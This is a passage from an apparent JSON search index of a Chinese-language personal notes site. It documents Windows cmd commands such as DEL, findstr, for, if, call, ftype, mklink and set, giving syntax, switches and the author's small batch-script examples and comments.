删除每一个文件之前提示确认。\n/F            强制删除只读文件。\n/S            删除所有子目录中的指定的文件。\n/Q            安静模式。删除全局通配符时，不要求确认\n/A            根据属性选择要删除的文件\n属性          R  只读文件            S  系统文件\n              H  隐藏文件            A  准备存档的文件\n              I  无内容索引文件      L  重新分析点\n              O  脱机文件            -  表示\"否\"的前缀 如果命令扩展被启用，DEL 和 ERASE 更改如下: /S 开关的显示句法会颠倒，即只显示已经删除的文件，而不显示找不到的文件。","tags":"操作系统","url":"/yq-docs-operating-system-Windows-windows_shell-DEL.html","loc":"/yq-docs-operating-system-Windows-windows_shell-DEL.html"},{"title":"findstr","text":"搜索字符串, 想找类似与linux下 grep 时找到的: PS C:\\Users\\yanque> tasklist | findstr dllhost\ndllhost.exe                   1416 Console                    9     27,020 K\ndllhost.exe                  19296 Console                    9     17,220 K 在文件中寻找字符串, 语法: FINDSTR [/B] [/E] [/L] [/R] [/S] [/I] [/X] [/V] [/N] [/M] [/O] [/P] [/F:file]\n        [/C:string] [/G:file] [/D:dir list] [/A:color attributes] [/OFF[LINE]]\n        strings [[drive:][path]filename[ ...]] 支持参数说明: /B         在一行的开始配对模式。\n/E         在一行的结尾配对模式。\n/L         按字使用搜索字符串。\n/R         将搜索字符串作为一般表达式使用。\n/S         在当前目录和所有子目录中搜索匹配文件。\n/I         指定搜索不分大小写。\n/X         打印完全匹配的行。\n/V         只打印不包含匹配的行。\n/N         在匹配的每行前打印行数。\n/M         如果文件含有匹配项，只打印其文件名。\n/O         在每个匹配行前打印字符偏移量。\n/P         忽略有不可打印字符的文件。\n/OFF[LINE] 不跳过带有脱机属性集的文件。\n/A:attr    指定有十六进位数字的颜色属性。请见 \"color /?\"\n/F:file    从指定文件读文件列表 (/ 代表控制台)。\n/C:string  使用指定字符串作为文字搜索字符串。\n/G:file    从指定的文件获得搜索字符串。 (/ 代表控制台)。\n/D:dir     查找以分号为分隔符的目录列表\nstrings    要查找的文字。\n[drive:][path]filename\n           指定要查找的文件。 除非参数有 /C 前缀，请使用空格隔开搜索字符串。\n例如, 在文件 x.y 中寻找 \"hello\" 或 \"there\" FINDSTR \"hello there\" x.y 文件 x.y  寻找\"hello there\" FINDSTR /C:\"hello there\" x.y 一般表达式的快速参考: .        通配符: 任何字符\n*        重复: 以前字符或类出现零或零以上次数\n&#94;        行位置: 行的开始\n$        行位置: 行的终点\n[class]  字符类: 任何在字符集中的字符\n[&#94;class] 补字符类: 任何不在字符集中的字符\n[x-y]    范围: 在指定范围内的任何字符\n/x       Escape: 元字符 x 的文字用法\n/<xyz    字位置: 字的开始\nxyz/>    字位置: 字的结束 多个搜索条件使用空格隔开, 如列出当前目录下, 非 . 开头, 不以 music 或者 video 开头的结果: dir /b | findstr /v /i \"\\. music video\"","tags":"操作系统","url":"/yq-docs-operating-system-Windows-windows_shell-Findstr.html","loc":"/yq-docs-operating-system-Windows-windows_shell-Findstr.html"},{"title":"goto","text":"将 cmd.exe 定向到批处理程序中带标签的行。 GOTO label label   指定批处理程序中用作标签的文字字符串。 标签必须单独一行，并且以冒号打头。 例: if %1 == 1 (\n  goto do1\n) else (\n  goto done\n)\n\n:do1\n  echo 1\n:done\n  echo done 实际使用: if %1 == 1 (\n  goto do1\n) else (\n  goto done\n) 也可以, 不知道为啥. 如果命令扩展被启用，GOTO 会如下改变: GOTO 命令现在接受目标标签 :EOF，这个标签将控制转移到当前批脚本文件的结尾。\n不定义就退出批脚本文件，这是一个容易的办法。\n有关能使该功能有用的 CALL 命令的扩展描述，请键入CALL /?。 看到有种说法是: rem  goto:eof 相当于函数的} 结尾标记，返回到调用者位置, 如果没有调用者直接就到末尾结束了\nrem  exit /b 0  结束当前cmd，返回exitCode 0","tags":"操作系统","url":"/yq-docs-operating-system-Windows-windows_shell-GOTO.html","loc":"/yq-docs-operating-system-Windows-windows_shell-GOTO.html"},{"title":"popd","text":"更改到 PUSHD 命令: pushd 存储的目录: POPD 如果命令扩展被启用，从推目录堆栈 POPD 驱动器时，POPD命令会删除 PUSHD 创建的临时驱动器号。","tags":"操作系统","url":"/yq-docs-operating-system-Windows-windows_shell-POPD.html","loc":"/yq-docs-operating-system-Windows-windows_shell-POPD.html"},{"title":"rmdir","text":"删除一个目录 语法: RMDIR [/S] [/Q] [drive:]path\nRD [/S] [/Q] [drive:]path 选项: /S  递归删除, 用于删除目录树. 类似于 linux rm 的 -r\n\n/D  安静模式. 类似于 linux rm 的 -f 注解 大小写不敏感, 如: rmdir /s xx","tags":"操作系统","url":"/yq-docs-operating-system-Windows-windows_shell-RMDIR.html","loc":"/yq-docs-operating-system-Windows-windows_shell-RMDIR.html"},{"title":"assoc","text":"显示或修改文件扩展名关联: ASSOC [.ext[=[fileType]]]\n\n.ext      指定跟文件类型关联的文件扩展名\nfileType  指定跟文件扩展名关联的文件类型 键入 ASSOC 而不带参数，显示当前文件关联。\n如果只用文件扩展名调用 ASSOC，则显示那个文件扩展名的当前文件关联。\n如果不为文件类型指定任何参数，命令会删除文件扩展名的关联。 注解 assoc 设置 文件扩展名关联, 关联到'文件类型' 与 ftype 设置文件类型关联, 关联到'执行程序和参数' 类似","tags":"操作系统","url":"/yq-docs-operating-system-Windows-windows_shell-assoc.html","loc":"/yq-docs-operating-system-Windows-windows_shell-assoc.html"},{"title":"call","text":"从批处理程序调用另一个批处理程序: CALL [drive:][path]filename [batch-parameters]\n\n  batch-parameters   指定批处理程序所需的命令行信息。 如果命令扩展被启用，CALL 会如下改变: CALL 命令现在将卷标当作 CALL 的目标接受。语法是: CALL:label arguments 一个新的批文件上下文由指定的参数所创建，控制在卷标被指定后传递到语句。\n你必须通过达到批脚本文件末两次来 \"exit\" 两次。\n第一次读到文件末时，控制会回到 CALL 语句的紧后面。\n第二次会退出批脚本。\n键入 GOTO /?，参看 GOTO :EOF 扩展的描述，此描述允许你从一个批脚本返回。 另外，批脚本文本参数参照(%0、%1、等等)已如下改变: 批脚本里的 %* 指出所有的参数(如 %1 %2 %3 %4 %5 ...)\n\n批参数(%n)的替代已被增强。你可以使用以下语法:\n\n    %~1         - 删除引号(\")，扩展 %1\n    %~f1        - 将 %1 扩展到一个完全合格的路径名\n    %~d1        - 仅将 %1 扩展到一个驱动器号\n    %~p1        - 仅将 %1 扩展到一个路径\n    %~n1        - 仅将 %1 扩展到一个文件名\n    %~x1        - 仅将 %1 扩展到一个文件扩展名\n    %~s1        - 扩展的路径只含有短名\n    %~a1        - 将 %1 扩展到文件属性\n    %~t1        - 将 %1 扩展到文件的日期/时间\n    %~z1        - 将 %1 扩展到文件的大小\n    %~$PATH:1   - 查找列在 PATH 环境变量的目录，并将 %1\n                  扩展到找到的第一个完全合格的名称。如果\n                  环境变量名未被定义，或者没有找到文件，\n                  此修改符会扩展到空字符串 可以组合修改符来取得多重结果: %~dp1       - 只将 %1 扩展到驱动器号和路径\n%~nx1       - 只将 %1 扩展到文件名和扩展名\n%~dp$PATH:1 - 在列在 PATH 环境变量中的目录里查找 %1，\n              并扩展到找到的第一个文件的驱动器号和路径。\n%~ftza1     - 将 %1 扩展到类似 DIR 的输出行。 在上面的例子中，%1 和 PATH 可以被其他有效数值替换。\n%~ 语法被一个有效参数号码终止。%~ 修定符不能跟 %*\n使用 此处提一下与 start 的区别: start的调用需要在调用的bat脚本内写入 exit 才能正常返回当前bat指令 call 的退出有没有 exit /b 即可, 默认就是这个 如, 1.bat 调用 2.bat , 使用 start: 使用 call: 输出都是: C:\\Users\\烟雀\\Desktop\\some\\t\\_>1.bat\nend 0\nend 1\nC:\\Users\\烟雀\\Desktop\\some\\t\\_> 使用call时, 在 2.bat 使用 exit 会退出整个程序,\n因为, call 是在一个批处理中直接调用另一个批处理, 不会打开新的窗口. 而 start 是新开一个窗口, 所以需要在新开的窗口手动 exit 退出. 要处理call执行子脚本退出父脚本可以使用: goto :eof 来替代, 表示转到文件末尾","tags":"操作系统","url":"/yq-docs-operating-system-Windows-windows_shell-call.html","loc":"/yq-docs-operating-system-Windows-windows_shell-call.html"},{"title":"color","text":"设置默认的控制台前景和背景颜色: COLOR [attr]\n\n  attr        指定控制台输出的颜色属性。 颜色属性由两个十六进制数字指定: 第一个对应于背景 第二个对应于前景 每个数字可以为以下任何值: 0 = 黑色       8 = 灰色\n1 = 蓝色       9 = 淡蓝色\n2 = 绿色       A = 淡绿色\n3 = 浅绿色     B = 淡浅绿色\n4 = 红色       C = 淡红色\n5 = 紫色       D = 淡紫色\n6 = 黄色       E = 淡黄色\n7 = 白色       F = 亮白色 如果没有给定任何参数，此命令会将颜色还原到 CMD.EXE 启动时的颜色。\n这个值来自当前控制台窗口、/T 命令行开关或 DefaultColor 注册表值。 如果尝试使用相同的前景和背景颜色来执行COLOR 命令，COLOR 命令会将 ERRORLEVEL 设置为 1。 示例: \"COLOR fc\" 在亮白色上产生淡红色","tags":"操作系统","url":"/yq-docs-operating-system-Windows-windows_shell-coloror.html","loc":"/yq-docs-operating-system-Windows-windows_shell-coloror.html"},{"title":"dir","text":"显示目录中的文件和子目录列表: DIR [drive:][path][filename] [/A[[:]attributes]] [/B] [/C] [/D] [/L] [/N]\n  [/O[[:]sortorder]] [/P] [/Q] [/R] [/S] [/T[[:]timefield]] [/W] [/X] [/4] 选项: [drive:][path][filename]\n            指定要列出的驱动器、目录和/或文件。\n\n/A          显示具有指定属性的文件。\n属性         D  目录                R  只读文件\n             H  隐藏文件            A  准备存档的文件\n             S  系统文件            I  无内容索引文件\n             L  重新分析点          O  脱机文件\n             -  表示\"否\"的前缀\n/B          使用空格式(没有标题信息或摘要)。\n/C          在文件大小中显示千位数分隔符。这是默认值。用 /-C 来\n            禁用分隔符显示。\n/D          跟宽式相同，但文件是按栏分类列出的。\n/L          用小写。\n/N          新的长列表格式，其中文件名在最右边。\n/O          用分类顺序列出文件。\n排列顺序     N  按名称(字母顺序)     S  按大小(从小到大)\n             E  按扩展名(字母顺序)   D  按日期/时间(从先到后)\n             G  组目录优先           -  反转顺序的前缀\n/P          在每个信息屏幕后暂停。\n/Q          显示文件所有者。\n/R          显示文件的备用数据流。\n/S          显示指定目录和所有子目录中的文件。\n/T          控制显示或用来分类的时间字符域\n时间段      C  创建时间\n            A  上次访问时间\n            W  上次写入的时间\n/W          用宽列表格式。\n/X          显示为非 8dot3 文件名产生的短名称。格式是 /N 的格式，\n            短名称插在长名称前面。如果没有短名称，在其位置则\n            显示空白。\n/4          以四位数字显示年份 可以在 DIRCMD 环境变量中预先设定开关。通过添加前缀 - (破折号)\n来替代预先设定的开关。例如，/-W。","tags":"操作系统","url":"/yq-docs-operating-system-Windows-windows_shell-dir.html","loc":"/yq-docs-operating-system-Windows-windows_shell-dir.html"},{"title":"exit","text":"可以查帮助文档: exit /?\n\n退出CMD.EXE程序或者当前解释器\nEXIT [/B] [exitCode]\n  /B          指定要退出当前批处理脚本而不是 CMD.EXE。如果从一个\n              批处理脚本外执行，则会退出 CMD.EXE\n  exitCode    指定一个数字号码。如果指定了 /B，将 ERRORLEVEL\n              设成那个数字。如果退出 CMD.EXE，则用那个数字设置\n              过程退出代码。","tags":"操作系统","url":"/yq-docs-operating-system-Windows-windows_shell-exit.html","loc":"/yq-docs-operating-system-Windows-windows_shell-exit.html"},{"title":"find","text":"在文件中搜索字符串: FIND [/V] [/C] [/N] [/I] [/OFF[LINE]] \"string\" [[drive:][path]filename[ ...]] 选项: /V         显示所有未包含指定字符串的行。\n/C         仅显示包含字符串的行数。\n/N         显示行号。\n/I         搜索字符串时忽略大小写。\n/OFF[LINE] 不要跳过具有脱机属性集的文件。\n\"string\" 指定要搜索的文本字符串。\n[drive:][path]filename\n           指定要搜索的文件。 如果没有指定路径，FIND 将搜索在提示符处键入\n的文本或者由另一命令产生的文本。 但是实际使用, 感觉 dir | find /c /v 更像是打印所有行 统计行数, 比如查找的python进程的个数: tasklist | findstr /I \"python\" | find /c /v \"\"","tags":"操作系统","url":"/yq-docs-operating-system-Windows-windows_shell-find.html","loc":"/yq-docs-operating-system-Windows-windows_shell-find.html"},{"title":"for","text":"循环: C:\\Users\\烟雀>for /? 对一组文件中的每一个文件执行某个特定命令: FOR %variable IN (set) DO command [command-parameters]\n\n  %variable  指定一个单一字母可替换的参数。\n  (set)      指定一个或一组文件。可以使用通配符。\n  command    指定对每个文件执行的命令。\n  command-parameters\n            为特定命令指定参数或命令行开关。 在批处理程序中使用 FOR 命令时，指定变量请使用 %%variable\n而不要用 %variable。变量名称是区分大小写的，所以 %i 不同于 %I. 如果启用命令扩展，则会支持下列 FOR 命令的其他格式: FOR /D %variable IN (set) DO command [command-parameters]\n\n  如果集中包含通配符，则指定与目录名匹配，而不与文件名匹配。\n\nFOR /R [[drive:]path] %variable IN (set) DO command [command-parameters]\n\n  检查以 [drive:]path 为根的目录树，指向每个目录中的 FOR 语句。\n  如果在 /R 后没有指定目录规范，则使用当前目录。如果集仅为一个单点(.)字符，\n  则枚举该目录树。\n\nFOR /L %variable IN (start,step,end) DO command [command-parameters]\n\n  该集表示以增量形式从开始到结束的一个数字序列。因此，(1,1,5)将产生序列\n  1 2 3 4 5，(5,-1,1)将产生序列(5 4 3 2 1)\n\nFOR /F [\"options\"] %variable IN (file-set) DO command [command-parameters]\nFOR /F [\"options\"] %variable IN (\"string\") DO command [command-parameters]\nFOR /F [\"options\"] %variable IN ('command') DO command [command-parameters]\n\n  或者，如果有 usebackq 选项:\n\nFOR /F [\"options\"] %variable IN (file-set) DO command [command-parameters]\nFOR /F [\"options\"] %variable IN (\"string\") DO command [command-parameters]\nFOR /F [\"options\"] %variable IN ('command') DO command [command-parameters]\n\n  简而言之就是表示表示寻找文件\n\n  fileset 为一个或多个文件名。继续到 fileset 中的下一个文件之前，\n  每份文件都被打开、读取并经过处理。处理包括读取文件，将其分成一行行的文字，\n  然后将每行解析成零或更多的符号。然后用已找到的符号字符串变量值调用 For 循环。\n  以默认方式，/F 通过每个文件的每一行中分开的第一个空白符号。跳过空白行。\n  你可通过指定可选 \"options\" 参数替代默认解析操作。这个带引号的字符串包括一个\n  或多个指定不同解析选项的关键字。这些关键字为:\n\n      eol=c           - 指一个行注释字符的结尾(就一个)\n      skip=n          - 指在文件开始时忽略的行数。\n      delims=xxx      - 指分隔符集。这个替换了空格和制表符的\n                        默认分隔符集。\n      tokens=x,y,m-n  - 指每行的哪一个符号被传递到每个迭代\n                        的 for 本身。这会导致额外变量名称的分配。m-n\n                        格式为一个范围。通过 nth 符号指定 mth。如果\n                        符号字符串中的最后一个字符星号，\n                        那么额外的变量将在最后一个符号解析之后\n                        分配并接受行的保留文本。\n      usebackq        - 指定新语法已在下类情况中使用:\n                        在作为命令执行一个后引号的字符串并且一个单\n                        引号字符为文字字符串命令并允许在 file-set\n                        中使用双引号扩起文件名称。 某些范例可能有助: FOR /F \"eol=; tokens=2,3* delims=, \" %i in (myfile.txt) do @echo %i %j %k 会分析 myfile.txt 中的每一行，忽略以分号打头的那些行，将\n每行中的第二个和第三个符号传递给 for 函数体，用逗号和/或\n空格分隔符号。请注意，此 for 函数体的语句引用 %i 来\n获得第二个符号，引用 %j 来获得第三个符号，引用 %k\n来获得第三个符号后的所有剩余符号。对于带有空格的文件\n名，你需要用双引号将文件名括起来。为了用这种方式来使\n用双引号，还需要使用 usebackq 选项，否则，双引号会\n被理解成是用作定义某个要分析的字符串的。 %i 在 for 语句中显式声明，%j 和 %k 是通过\ntokens= 选项隐式声明的。可以通过 tokens= 一行\n指定最多 26 个符号，只要不试图声明一个高于字母 \"z\" 或\n\"Z\" 的变量。请记住，FOR 变量是单一字母、分大小写和全局的变量；\n而且，不能同时使用超过 52 个。 还可以在相邻字符串上使用 FOR /F 分析逻辑，方法是，\n用单引号将括号之间的 file-set 括起来。这样，该字符\n串会被当作一个文件中的一个单一输入行进行解析。 最后，可以用 FOR /F 命令来分析命令的输出。方法是，将\n括号之间的 file-set 变成一个反括字符串。该字符串会\n被当作命令行，传递到一个子 CMD.EXE，其输出会被捕获到\n内存中，并被当作文件分析。如以下例子所示: FOR /F \"usebackq delims==\" %i IN (`set`) DO @echo %i 会枚举当前环境中的环境变量名称。 另外，FOR 变量参照的替换已被增强。你现在可以使用下列\n选项语法: %~I         - 删除任何引号(\")，扩展 %I\n%~fI        - 将 %I 扩展到一个完全合格的路径名\n%~dI        - 仅将 %I 扩展到一个驱动器号\n%~pI        - 仅将 %I 扩展到一个路径\n%~nI        - 仅将 %I 扩展到一个文件名\n%~xI        - 仅将 %I 扩展到一个文件扩展名\n%~sI        - 扩展的路径只含有短名\n%~aI        - 将 %I 扩展到文件的文件属性\n%~tI        - 将 %I 扩展到文件的日期/时间\n%~zI        - 将 %I 扩展到文件的大小\n%~$PATH:I   - 查找列在路径环境变量的目录，并将 %I 扩展\n              到找到的第一个完全合格的名称。如果环境变量名\n              未被定义，或者没有找到文件，此组合键会扩展到\n              空字符串 可以组合修饰符来得到多重结果: %~dpI       - 仅将 %I 扩展到一个驱动器号和路径\n%~nxI       - 仅将 %I 扩展到一个文件名和扩展名\n%~fsI       - 仅将 %I 扩展到一个带有短名的完整路径名\n%~dp$PATH:I - 搜索列在路径环境变量的目录，并将 %I 扩展\n              到找到的第一个驱动器号和路径。\n%~ftzaI     - 将 %I 扩展到类似输出线路的 DIR 在以上例子中，%I 和 PATH 可用其他有效数值代替。%~ 语法\n用一个有效的 FOR 变量名终止。选取类似 %I 的大写变量名\n比较易读，而且避免与不分大小写的组合键混淆。","tags":"操作系统","url":"/yq-docs-operating-system-Windows-windows_shell-for.html","loc":"/yq-docs-operating-system-Windows-windows_shell-for.html"},{"title":"ftype","text":"显示或修改用在文件扩展名关联中的文件类型: FTYPE [fileType[=[openCommandString]]]\n\nfileType  指定要检查或改变的文件类型\nopenCommandString 指定调用这类文件时要使用的开放式命令。 键入 FTYPE 而不带参数来显示当前有定义的开放式命令字符串的文件类型。\nFTYPE 仅用一个文件类型启用时，它显示那个文件类型目前的开放式命令字符串。\n如果不为开放式命令字符串指定，FTYPE 命令将删除那个文件类型的开放式命令字符串。\n在一个开放式命令字符串之内，命令字符串 %0 或 %1 被通过关联调用的文件名所代替。\n%* 得到所有的参数，\n%2 得到第一个参数，\n%3 得到第二个，等等。\n%~n 得到其余所有以 nth 参数打头的参数；\nn 可以是从 2 到 9 的数字。例如: ASSOC .pl=PerlScript\nFTYPE PerlScript=perl.exe %1 %* 允许你启用以下 Perl 脚本: script.pl 1 2 3 如果不想键入扩展名，则键入以下字符串: set PATHEXT=.pl;%PATHEXT% 被启动的脚本如下: script 1 2 3 注解 ftype 设置 设置文件类型关联, 关联到'执行程序和参数' 与 assoc 文件扩展名关联, 关联到'文件类型' 类似 说明: 当你双击一个.txt文件时，windows并不是根据.txt直接判断用 notepad.exe 打开\n而是先判断.txt属于 txtfile '文件类型'\n再调用 txtfile 关联的命令行 txtfile=%SystemRoot%system32NOTEPAD.EXE %1 可以在\"文件夹选项\"→\"文件类型\"里修改这2种关联: assoc           #显示所有'文件扩展名'关联\nassoc .txt      #显示.txt代表的'文件类型'，结果显示 .txt=txtfile\nassoc .doc      #显示.doc代表的'文件类型'，结果显示 .doc=Word.Document.8\nassoc .exe      #显示.exe代表的'文件类型'，结果显示 .exe=exefile\nftype           #显示所有'文件类型'关联\nftype exefile   #显示exefile类型关联的命令行，结果显示 exefile=\"%1\" %*\nassoc .txt=Word.Document.8 设置.txt为word类型的文档，可以看到.txt文件的图标都变了: assoc .txt=txtfile 恢复.txt的正确关联: ftype exefile=\"%1\" %* 恢复 exefile 的正确关联 如果该关联已经被破坏，可以运行 command.com ，再输入这条命令","tags":"操作系统","url":"/yq-docs-operating-system-Windows-windows_shell-ftype.html","loc":"/yq-docs-operating-system-Windows-windows_shell-ftype.html"},{"title":"if","text":"执行批处理程序中的条件处理: IF [NOT] ERRORLEVEL number command\nIF [NOT] string1==string2 command\nIF [NOT] EXIST filename command\n\nNOT               指定只有条件为 false 的情况下，Windows 才\n                  应该执行该命令。\n\nERRORLEVEL number 如果最后运行的程序返回一个等于或大于\n                  指定数字的退出代码，指定条件为 true。\n\nstring1==string2  如果指定的文字字符串匹配，指定条件为 true。\n\nEXIST filename    如果指定的文件名存在，指定条件为 true。\n\ncommand           如果符合条件，指定要执行的命令。如果指定的\n                  条件为 FALSE，命令后可跟 ELSE 命令，该命令将\n                  在 ELSE 关键字之后执行该命令。 ELSE 子句必须出现在同一行上的 IF 之后。例如: IF EXIST filename. (\n    del filename.\n) ELSE (\n    echo filename. missing.\n) 由于 del 命令需要用新的一行终止，因此以下子句不会有效: IF EXIST filename. del filename. ELSE echo filename. missing 由于 ELSE 命令必须与 IF 命令的尾端在同一行上，以下子句也不会有效: IF EXIST filename. del filename.\nELSE echo filename. missing 如果都放在同一行上，以下子句有效: IF EXIST filename. (del filename.) ELSE echo filename. missing 如果命令扩展被启用，IF 会如下改变: IF [/I] string1 compare-op string2 command\nIF CMDEXTVERSION number command\nIF DEFINED variable command 其中， compare-op 可以是: EQU - 等于\nNEQ - 不等于\nLSS - 小于\nLEQ - 小于或等于\nGTR - 大于\nGEQ - 大于或等于 而 /I 开关(如果指定)说明要进行的字符串比较不分大小写。\n/I 开关可以用于 IF 的 string1==string2 的形式上。\n这些比较都是通用的；\n原因是，如果 string1 和 string2 都是由数字组成的，字符串会被转换成数字，进行数字比较。 CMDEXTVERSION 条件的作用跟 ERRORLEVEL 的一样，除了它是在跟与命令扩展有关联的内部版本号比较。\n第一个版本是 1。\n每次对命令扩展有相当大的增强时，版本号会增加一个。\n命令扩展被停用时，CMDEXTVERSION 条件不是真的。 如果已定义环境变量，DEFINED 条件的作用跟 EXIST 的一样，除了它取得一个环境变量，返回的结果是 true。 如果没有名为 ERRORLEVEL 的环境变量，%ERRORLEVEL% 会扩充为 ERROLEVEL 当前数值的字符串表达式；\n否则，你会得到其数值。\n运行程序后，以下语句说明 ERRORLEVEL 的用法: goto answer%ERRORLEVEL%\n:answer0\necho Program had return code 0\n:answer1\necho Program had return code 1 你也可以使用以上的数字比较: IF %ERRORLEVEL% LEQ 1 goto okay 如果没有名为 CMDCMDLINE 的环境变量，%CMDCMDLINE%\n将在 CMD.EXE 进行任何处理前扩充为传递给 CMD.EXE 的原始\n命令行；否则，你会得到其数值。 如果没有名为 CMDEXTVERSION 的环境变量，\n%CMDEXTVERSION% 会扩充为 CMDEXTVERSION 当前数值的\n字串符表达式；否则，你会得到其数值。","tags":"操作系统","url":"/yq-docs-operating-system-Windows-windows_shell-if.html","loc":"/yq-docs-operating-system-Windows-windows_shell-if.html"},{"title":"mklink","text":"创建符号链接。 使用: MKLINK [[/D] | [/H] | [/J]] Link Target\n\n        /D      创建目录符号链接。默认为文件符号链接。\n        /H      创建硬链接而非符号链接。\n        /J      创建目录联接。\n        Link    指定新的符号链接名称。 其实应该叫target， 链接到的地址\n        Target  指定新链接引用的路径。 其实应该叫source， 真实源地址\n                (相对或绝对)。 注解 Windows 下参数顺序相对于Linux是颠倒的, 先链接的目标, 再链接的源","tags":"操作系统","url":"/yq-docs-operating-system-Windows-windows_shell-mklink.html","loc":"/yq-docs-operating-system-Windows-windows_shell-mklink.html"},{"title":"mode","text":"配置系统设备。 串行端口: MODE COMm[:] [BAUD=b] [PARITY=p] [DATA=d] [STOP=s]\n              [to=on|off] [xon=on|off] [odsr=on|off]\n              [octs=on|off] [dtr=on|off|hs]\n              [rts=on|off|hs|tg] [idsr=on|off] 设备状态: MODE [device] [/STATUS] 打印重定向: MODE LPTn[:]=COMm[:] 选择代码页: MODE CON[:] CP SELECT=yyy 代码页状态: MODE CON[:] CP [/STATUS] 显示模式: MODE CON[:] [COLS=c] [LINES=n] 击键率: MODE CON[:] [RATE=r DELAY=d] 例: mode con cols=113 lines=15 & color 9f 此命令设置DOS窗口大小：15行，113列","tags":"操作系统","url":"/yq-docs-operating-system-Windows-windows_shell-mode.html","loc":"/yq-docs-operating-system-Windows-windows_shell-mode.html"},{"title":"move","text":"移动文件并重命名文件和目录。 要移动至少一个文件: MOVE [/Y | /-Y] [drive:][path]filename1[,...] destination 要重命名一个目录: MOVE [/Y | /-Y] [drive:][path]dirname1 dirname2\n\n  [drive:][path]filename1 指定你想移动的文件位置和名称。\n  destination             指定文件的新位置。目标可包含一个驱动器号\n                          和冒号、一个目录名或组合。如果只移动一个文件\n                          并在移动时将其重命名，你还可以包括文件名。\n  [drive:][path]dirname1  指定要重命名的目录。\n  dirname2                指定目录的新名称。\n\n  /Y                      取消确认覆盖一个现有目标文件的提示。\n  /-Y                     对确认覆盖一个现有目标文件发出提示。 命令行开关 /Y 可以出现在 COPYCMD 环境变量中。\n这可以用命令行上的 /-Y 替代。\n默认值是，除非 MOVE 命令是从一个批脚本内执行的，覆盖时都发出提示。","tags":"操作系统","url":"/yq-docs-operating-system-Windows-windows_shell-move.html","loc":"/yq-docs-operating-system-Windows-windows_shell-move.html"},{"title":"pause","text":"暂停脚本, 可用于debug","tags":"操作系统","url":"/yq-docs-operating-system-Windows-windows_shell-pause.html","loc":"/yq-docs-operating-system-Windows-windows_shell-pause.html"},{"title":"pushd","text":"保存当前目录以供 POPD 命令: popd 使用，然后改到指定的目录: PUSHD [path | ..]\n\n  path        指定要成为当前目录的目录。 如果命令扩展被启用，除了一般驱动器号和路径，PUSHD命令还接受网络路径。\n如果指定了网络路径，PUSHD 将创建一个指向指定网络资源的临时驱动器号，然后再用刚定义的驱动器号更改当前的驱动器和目录。\n可以从 Z: 往下分配临时驱动器号，使用找到的第一个没有用过的驱动器号。 例如: @echo off\nc: & cd\\ & md mp3       #在 C:\\ 建立 mp3 文件夹\nmd d:\\mp4               #在 D:\\ 建立 mp4 文件夹\ncd /d d:\\mp4            #更改当前目录为 d:\\mp4\npushd c:\\mp3            #保存当前目录，并切换当前目录为 c:\\mp3\npopd                    #恢复当前目录为刚才保存的 d:\\mp4","tags":"操作系统","url":"/yq-docs-operating-system-Windows-windows_shell-pushd.html","loc":"/yq-docs-operating-system-Windows-windows_shell-pushd.html"},{"title":"set","text":"用于设置变量 显示、设置或删除 cmd.exe 环境变量。 语法: SET [variable=[string]]\n\n  variable  指定环境变量名。\n  string    指定要指派给变量的一系列字符串。 注解 string 中引号也被视作变量的一部分 set设置的变量, =左右不能有空格. 显示当前环境变量 要 显示当前环境变量 ，键入不带参数的 SET: set 如果命令扩展被启用，SET 会如下改变: 查找当前环境变量 可仅用一个变量激活 SET 命令，等号或值不显示所有前缀匹配 SET 命令已使用的名称的所有变量的值。 例如: SET P 会显示所有以字母 P 打头的变量 如果在当前环境中找不到该变量名称，SET 命令将把 ERRORLEVEL 设置成 1。 注解 SET 命令不允许变量名含有等号。 命令行开关 在 SET 命令中添加了两个新命令行开关: SET /A expression\nSET /P variable=[promptString] /A 命令行开关指定等号右边的字符串为被评估的数字表达式。该表达式评估器很简单并以递减的优先权顺序支持下列操作: ()                  - 分组\n! ~ -               - 一元运算符\n* / %               - 算数运算符\n+ -                 - 算数运算符\n<< >>               - 逻辑移位\n&                   - 按位\"与\"\n&#94;                   - 按位\"异\"\n|                   - 按位\"或\"\n= *= /= %= += -=    - 赋值\n  &= &#94;= |= <<= >>=\n,                   - 表达式分隔符 如果你使用任何逻辑或取余操作符， 你需要将表达式字符串用引号扩起来。 在表达式中的任何非数字字符串键作为环境变量名称，这些环境变量名称的值已在使用前转换成数字。 如果指定了一个环境变量名称，但未在当前环境中定义，那么值将被定为零。\n这使你可以使用环境变量值做计算而不用键入那些 % 符号来得到它们的值。 如果 SET /A 在命令脚本外的命令行执行的，那么它显示该表达式的最后值。\n该分配的操作符在分配的操作符左边需要一个环境变量名称。 除十六进制有 0x 前缀，八进制有 0 前缀的，数字值为十进位数字。\n因此，0x12 与 18 和 022相同。请注意八进制公式可能很容易搞混: 08 和 09 是无效的数字，\n因为 8 和 9 不是有效的八进制位数。(& ) /P 命令行开关允许将变量数值设成用户输入的一行输入。读取输入\n行之前，显示指定的 promptString。promptString 可以是空的。 变量局部替换及其他 字符串替换 环境变量替换(即字符串替换)已如下增强: %PATH:str1=str2% 会扩展 PATH 环境变量，用 \"str2\" 代替扩展结果中的每个 \"str1\"。\n要有效地从扩展结果中删除所有的 \"str1\"，\"str2\" 可以是空的。 \"str1\" 可以以星号打头；在这种情况下，\"str1\" 会从扩展结果的开始到 str1 剩余部分第一次出现的地方，都一直保持相配。 字符串提取 也可以为扩展名指定子字符串(即提取字符串): %PATH:~10,5% 会扩展 PATH 环境变量，然后只使用在扩展结果中从第 11 个(偏移量 10)字符开始的五个字符。 如果没有指定长度，则采用默认值，即变量数值的余数。 如果两个数字(偏移量和长度)都是负数，使用的数字则是环境变量数值长度加上指定的偏移量或长度. 提取 PATH 变量的最后十个字符: %PATH:~-10% 提取 PATH 变量的所有字符，除了最后两个: %PATH:~0,-2% 延迟环境变量拓展相关 如何添加? setlocal ENABLEDELAYEDEXPANSION 然后后面变量加感叹号即可.\n详情见: setlocal 延迟环境变量扩充的支持。该支持总是按默认值被停用，但也可以通过 CMD.EXE 的 /V 命令行开关而被启用/停用。请参阅 CMD /? 考虑到读取一行文本时所遇到的目前扩充的限制时，延迟环境变量扩充是很有用的，而不是执行的时候。 以下例子说明直接变量扩充的问题: set VAR=before\nif \"%VAR%\" == \"before\" (\nset VAR=after\nif \"%VAR%\" == \"after\" @echo If you see this, it worked ) 不会显示消息，因为 %VAR% 的值会被预先替换掉. 即: C:\\Users\\烟雀\\Desktop\\some\\t\\_>3.bat\n\nset VAR=before\n\nif \"before\" == \"before\" (\nset VAR=after\nif \"before\" == \"after\"\n) 因为在 '预编译'(对这个不熟, 暂且这样定义)时候，两个 if 语句中的 %VAR% 会被代替； 因为 最外部的 if 是一个复合语句, 所以，复合语句中的 if(第二个if) 实际上是在比较 